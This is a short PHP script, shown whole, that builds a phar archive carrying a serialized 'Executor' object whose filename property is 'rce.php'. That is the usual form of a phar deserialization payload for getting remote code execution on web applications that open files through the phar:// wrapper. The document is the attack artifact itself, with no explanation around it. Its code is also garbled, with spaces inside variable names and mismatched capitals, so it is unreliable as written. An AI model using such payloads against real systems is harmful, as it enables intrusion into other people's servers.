<? Php
$ phar = new Phar ('test.phar');
$ Phar-> startBuffering ();
$ phar-> setStub ('<? php __HALT_COMPILER ();?>');

class Executor {
  private $ filename = 'rce.php';
  private $ signature = '8a54d751b7e2bbbb2643d355d49e81be';
}
$ object = new Executor ();
$ Phar-> setMetadata ($ object);
$ phar-> addFromString ('test.txt', 'text');
$ Phar-> stopBuffering ();

?>